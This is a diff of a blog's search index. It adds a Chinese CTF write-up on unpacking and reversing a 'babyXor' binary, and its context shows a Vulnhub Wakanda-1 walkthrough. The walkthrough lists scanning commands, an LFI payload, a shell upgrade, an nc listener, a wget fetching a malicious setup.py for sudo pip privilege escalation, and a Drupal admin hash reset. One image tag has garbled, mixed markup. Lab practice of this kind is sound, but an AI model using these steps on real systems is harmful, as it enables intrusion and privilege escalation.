@@ -1,6 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>UNCTF2019-re</title>
+    <url>/2019/11/02/UNCTF%20%E7%AB%9E%E6%8A%80%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="babyXor"><a href="#babyXor" class="headerlink" title="babyXor"></a>babyXor</h1><p>题目下载地址：<a href="https://github.com/wowrice/REVERSE/blob/master/babyXor.exe" target="_blank" rel="noopener">https://github.com/wowrice/REVERSE/blob/master/babyXor.exe</a></p>
+<p>简单的看一下题目：<img src="https://i.loli.net/2019/11/03/gTKXCt8VL5UzJRQ.png" alt="BC54@__VUH8E~HJ__BUP25P.png"></p>
+<p>查壳：<img src="https://i.loli.net/2019/11/03/AzTdrgUb6escI8W.png" alt="___~F__O_RCG6PWKWR~__ZK.png"></p>
+<p>od打开：<img src="https://i.loli.net/2019/11/03/ivbeGzoKFpElYat.png" alt="H_Z0T7_9W4DON2Z3KQP66EP.png"><br>虽然查壳工具没有查到壳，从od可以看出有壳（pushad加壳的关键句），继续手动脱壳<br><strong>F8</strong>运行pushad</p>
+<p><img src="https://i.loli.net/2019/11/03/nkqsXymHfYDFMTg.png" alt="M_FGWDNO_73_JS3Q_SZ929P.png"></p>
+<p>观察esp,给<strong>esp设置一个断点</strong><br><img src="https://i.loli.net/2019/11/03/rAd6JayONiCbutw.png" alt="_0@Y_5FKBR~6WO_XOKH9J_T.png"></p>
+<p><strong>F9运行</strong>，程序停在如图位置<br><img src="https://i.loli.net/2019/11/03/GJXx9eankYmSiBo.png" alt="~8S9AR16_~_3YC3_U~_1USC.png"><br><strong>F8</strong>，显示代码<br><img src="https://i.loli.net/2019/11/03/4r5HhzmJqWATfOF.png" alt="BS5_X5TBRB`X4P9VYLPZ8_M.png](https://i.loli.net/2019/11/03/4r5HhzmJqWATfOF.png)
+此处应该是程序的OEP，删除之前断点
+![S__ZOX_VQ~VFDJJ7PU_H4A0.png](https://i.loli.net/2019/11/03/PU6h7FH4bQj8DJK.png)
+脱壳
+![BS5_X5TBRB`X4P9VYLPZ8_M.png"><br><img src="https://i.loli.net/2019/11/03/DzREHI81MjlytZO.png" alt="_S1_LMRWB@G1VMT0Z9K20~F.png"><br>脱壳完成后发现od无法再打开<br><img src="https://i.loli.net/2019/11/03/iQcP6jJKmtYLRM2.png" alt="QYG_O_AEUII3__G2__@_@EG.png"><br>使用工具<strong>imporREC</strong>进行修复<br><img src="https://i.loli.net/2019/11/03/e3fNqF26ixbjHGn.png" alt="RDPMNG_4XME_YOXID__IKMM.png"><br>如图就是修复后的文件：<img src="https://i.loli.net/2019/11/03/U41EVtqOJYLdCi6.png" alt="@7EEOW1_EP__~5KBBGF___Q.png"><br>继续进行od分析<br><img src="https://i.loli.net/2019/11/03/bp1T4qX3tBlHWCc.png" alt="_3DVR_T4DXIBQ1_`@S_Q_HL.png"><br><strong>F8</strong>大致跟一遍程序，发现程序运行到如下位置时弹出文字，<strong>F7</strong>跟入<br><img src="https://i.loli.net/2019/11/03/PU6h7FH4bQj8DJK.png" alt="S__ZOX_VQ~VFDJJ7PU_H4A0.png"><br>一路<strong>F8</strong>，可得flag<br><img src="https://i.loli.net/2019/11/03/DZjSz54VNI93ebu.png" alt="TXS8GX01ADTS~V~__J~X0_1.png"></p>
+]]></content>
+      <categories>
+        <category>re</category>
+      </categories>
+      <tags>
+        <tag>re</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vulnhub Wakanda靶机实践</title>
     <url>/2019/10/17/Vnlnhnb%20Wakanda-1/</url>
     <content><![CDATA[<h1 id="Wakanda-1-过程总结"><a href="#Wakanda-1-过程总结" class="headerlink" title="Wakanda-1 过程总结"></a>Wakanda-1 过程总结</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看本机IP：    ip a</span><br><span class="line"></span><br><span class="line">目标IP：    arp-scan -l</span><br><span class="line">全端口扫描：    nmap -sV -p- 192.168.56.101</span><br><span class="line">网站目录枚举：  dirb http://192.168.56.101</span><br><span class="line">网站漏洞扫描：  nikto -h http://192.168.56.101/</span><br><span class="line">在网站目录 cd /var/www/html/ </span><br><span class="line"></span><br><span class="line">LFI：   curl http://192.168.56.101/?lang=php://filter/convert.base64-encode/resource=index</span><br><span class="line"></span><br><span class="line">远程连接：ssh mamadou@192.168.56.101 -p 3333</span><br><span class="line">查看用户权限：  sudo -l</span><br><span class="line">python提示符界面：</span><br><span class="line">&gt;&gt;&gt;import pty</span><br><span class="line">&gt;&gt;&gt;pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line"></span><br><span class="line">nc监听: nc -lvvp 5555</span><br><span class="line">建立简单的服务器：  python -m SimpleHTTPServer 8888</span><br><span class="line">查看用户文件：  find / -user devops 2&gt;/dev/null</span><br><span class="line">目的机新建文件：  mkdir fakepip 执行pip漏洞-&gt;cd fakepip</span><br><span class="line">从本地机下载：  wget http://192.168.0.104:8888/setup.py</span><br><span class="line">目的机下载set.up执行fakepip：   sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>
@@ -72,7 +94,7 @@
 <p>show databases;<br>use drupaldb;<br>show tables;<br>select * from users;</p>
 </blockquote>
 <p>database无果，尝试tables可看到users<br><img src="https://i.loli.net/2019/10/14/YBoVDJk5KGCWstx.png" alt="SLG~UN6AL_BQOGN@_U47036.png"></p>
-<p><img src="https://i.loli.net/2019/10/14/gN4USrIVJ2WbPDX.png" alt="~5_P_HPYCZ5_M__@DR4~8I2.png"><br>得到admin的账号和密码，但是密码已经加密，重置drupal的密码，把管理员的密码字段改成  </p>
+<p><img src="https://i.loli.net/2019/10/14/gN4USrIVJ2WbPDX.png" alt="~5_P_HPYCZ5_M__@DR4~8I2.png"><br>得到admin的账号和密码，但是密码已经加密，重置drupal的密码，把管理员的密码字段改成  password的 SHA-512加密</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/14/xaUEl9KefM18HiP.png" alt="S__RJ_V9I6_2LXPV3__M7LD.png"></p>
